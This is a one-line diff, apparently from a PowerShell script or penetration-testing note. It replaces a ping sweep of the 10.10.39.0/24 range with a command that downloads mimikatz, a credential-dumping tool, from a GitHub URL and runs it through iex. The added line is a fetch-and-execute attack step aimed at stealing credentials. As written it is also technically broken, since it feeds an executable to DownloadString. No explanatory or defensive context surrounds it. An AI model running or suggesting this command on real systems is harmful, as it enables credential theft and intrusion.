@@ -1,1 +1,1 @@
-1..254 | ForEach-Object {$ip = "10.10.39.$_"; ping -n 1 $ip} 
+iex(New-Object Net.webclient).downloadstring('https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe')
